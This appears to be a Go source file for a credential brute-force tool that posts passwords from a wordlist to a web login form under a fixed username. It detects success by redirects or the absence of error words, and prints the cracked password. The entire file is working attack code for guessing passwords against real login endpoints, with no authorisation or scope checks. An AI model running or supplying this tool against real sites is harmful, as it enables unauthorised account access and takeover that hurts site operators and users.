package proxy

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type AttackConfig struct {
	TargetURL    string
	Username     string
	Wordlist     string
	UserField    string // default "username"
	PassField    string // default "password"
	SuccessRegex string // optional
}

type AttackProgressMsg struct {
	AttemptCount int
	Password     string
	Status       string // "Running", "Success", "Failed", "Error"
	FinalURL     string
	ErrorMsg     string
}

func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg) {
	if config.UserField == "" { config.UserField = "username" }
	if config.PassField == "" { config.PassField = "password" }

	file, err := os.Open(config.Wordlist)
	if err != nil {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
		return
	}
	defer file.Close()

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	scanner := bufio.NewScanner(file)
	attemptCount := 0
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password == "" { continue }
		attemptCount++

		updateChan <- AttackProgressMsg{
			AttemptCount: attemptCount,
			Password:     password,
			Status:       "Running",
		}

		data := url.Values{}
		data.Set(config.UserField, config.Username)
		data.Set(config.PassField, password)

		req, err := http.NewRequest("POST", config.TargetURL, strings.NewReader(data.Encode()))
		if err != nil { continue }
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil { continue }

		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		finalURL := resp.Request.URL.String()
		isSuccess := false

		// Success detection: Redirect or 200 without error words
		if resp.StatusCode == 302 || resp.StatusCode == 301 {
			isSuccess = true
			finalURL = resp.Header.Get("Location")
		} else if resp.StatusCode == 200 {
			bodyStr := strings.ToLower(string(bodyBytes))
			if !strings.Contains(bodyStr, "incorrect") && !strings.Contains(bodyStr, "invalid") && !strings.Contains(bodyStr, "failed") {
				isSuccess = true
			}
		}

		if isSuccess {
			updateChan <- AttackProgressMsg{
				AttemptCount: attemptCount,
				Password:     password,
				Status:       "Success",
				FinalURL:     finalURL,
			}
			return
		}
	}

	if err := scanner.Err(); err != nil {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error reading wordlist: %v", err)}
		return
	}

	updateChan <- AttackProgressMsg{Status: "Failed"}
}

func RunBruteForce(config AttackConfig) {
	updateChan := make(chan AttackProgressMsg)
	go RunBruteForceUI(config, updateChan)
	for msg := range updateChan {
		if msg.Status == "Running" {
			fmt.Printf("\rAttempt %d: Trying %s...", msg.AttemptCount, msg.Password)
		} else if msg.Status == "Success" {
			fmt.Printf("\n[+] SUCCESS! Password: %s\n", msg.Password)
			return
		}
	}
}

